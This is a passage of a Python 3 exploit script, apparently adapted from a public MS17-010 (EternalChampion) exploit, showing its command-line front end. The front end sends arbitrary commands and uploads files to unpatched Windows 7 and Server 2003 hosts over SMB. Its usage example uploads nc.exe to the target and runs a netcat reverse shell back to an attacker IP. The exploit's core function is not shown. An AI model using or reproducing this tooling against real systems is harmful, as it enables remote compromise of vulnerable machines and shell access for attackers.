    parser = argparse.ArgumentParser(description="Python3 (partially) adaptation of the original zzz_exploit.py from worawit (https://github.com/worawit/MS17-010)\nThis exploit is tested on windows 7 and windows server 2003. Because zzz_exploit, and therefore this exploit, is based in eternal champion exploit, you will need accessible named pipes to get it work.")
    
    parser = argparse.ArgumentParser(usage='\n   python3 eternal.py -i <remote ip> -t <file to transfer> -o <output file name>\n   python3 eternal.py -i <remote ip> -c <rce to execute>\n\n NOTE: files transfered will appear inside remote host like c:\\<output file name>\n\nexample usage: python3 eternal.py -i 10.10.10.40 -t nc.exe -o nc.exe -c \'c:/nc.exe 10.10.15.8 4455 -e cmd.exe\'')

    parser.add_argument("-i", "--ip", required=True, help="remote host ip")

    parser.add_argument("-c", "--command", help="Command you want to be executed into the target")

    parser.add_argument("-t", "--transfer", help="route to the file you want to transfer")

    parser.add_argument("-o", "--output", help="final output name (will be send to c:\\<filename>")

    if len(sys.argv) == 1:
        banner()
        parser.print_usage()
        sys.exit()

    args = parser.parse_args()

    if args.transfer and not args.output:
        print("Error: If you use the flag -t, also must use the flag -o to specify destination.")
        sys.exit(1)

    if args.command and not args.transfer:
        print(f"Executing a RCE in {args.ip}: {args.command}")
        route_file_input = ''
        route_file_output = ''
        command=args.command
        command_bolean=True
        transfer_bolean=False
        smb_attack(args.ip, command_bolean, transfer_bolean, route_file_input, route_file_output, command)   

    if args.transfer and not args.command:
        print(f"Transfering file from {args.transfer} to {args.output} in {args.ip}")
        command=''
        route_file_input = args.transfer
        route_file_output = args.output
        command_bolean=False
        transfer_bolean=True
        smb_attack(args.ip, command_bolean, transfer_bolean, route_file_input, route_file_output, command)

    if args.transfer and args.command:
        command=args.command
        route_file_input = args.transfer
        route_file_output = args.output
        command_bolean=True
        transfer_bolean=True
        smb_attack(args.ip, command_bolean, transfer_bolean, route_file_input, route_file_output, command)

    if not args.command and not args.transfer:
        print("No action specified. Use -c for RCE o -t and -o for file transfer.")
        sys.exit(1)

    
if __name__ == "__main__":
    main()
























